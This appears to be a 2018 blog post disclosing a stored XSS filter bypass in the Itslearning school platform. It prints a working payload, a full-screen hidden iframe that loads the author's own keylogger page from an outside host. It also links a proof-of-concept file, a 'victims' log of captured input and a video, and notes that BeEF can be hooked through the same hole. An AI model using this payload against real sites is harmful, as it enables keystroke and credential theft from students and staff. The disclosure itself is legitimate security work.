---
title: "ITSLEARNING XSS PART 2"
date: "2018-01-27"
category: blog
headerImage: true
tags: 
  - "cyber-security"
  - "iframe"
  - "itslearning-webcam"
  - "itslearning-xss"
  - "muskecan"
  - "mustafa-kemal-can"
  - "siber-guvenlik"
image: /assets/posts/itslearning-xss-vulnerability.jpg
---

Today I want to explain you how I can still be able to execute javascript payloads on Itslearning education syste. Itslearning XSS part 2 begins!

You should check the part 1 of this article.

#### [ITSLEARNING STORED XSS VULNERABILITY OR NOT?](https://mustafakemalcan.com/itslearning-stored-xss-vulnerability/)

Mr. Håkon Høydal, [wrote an article](https://www.vg.no/nyheter/innenriks/i/9mEe29/sikkerhetshull-i-skoleportal-mener-han-kan-få-tilgang-til-dine-barns-webkamera) about Itslearning. After that Itslearning, did some things to filter javascript codes. But this is not enough I guess.

## Itslearning XSS - iFrame is the key!

With the help of an iframe which is fullscreen and hidden, I can execute my keylogger payload.

#### Payload and PoC;

<iframe src\="[https://mustafakemalcan.com/keylog.html](https://mustafakemalcan.com/keylog.html)" style\="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">Your browser doesn't support iframes</iframe>

**PoC** : https://files.itslearning.com/data/2099/13132/keylog.html

I can call my evil js by the way. So, **I still can use BeeF XSS Framework.**

[Here is the logs.](https://mustafakemalcan.com/victims.txt)

The second XSS, I consider that not an harmful but I think Itslearning shouldn't allow something like that.

https://youtu.be/z6PUMjiNWX4

I need say thanks to **Ingvald Straume** for helps in this process.
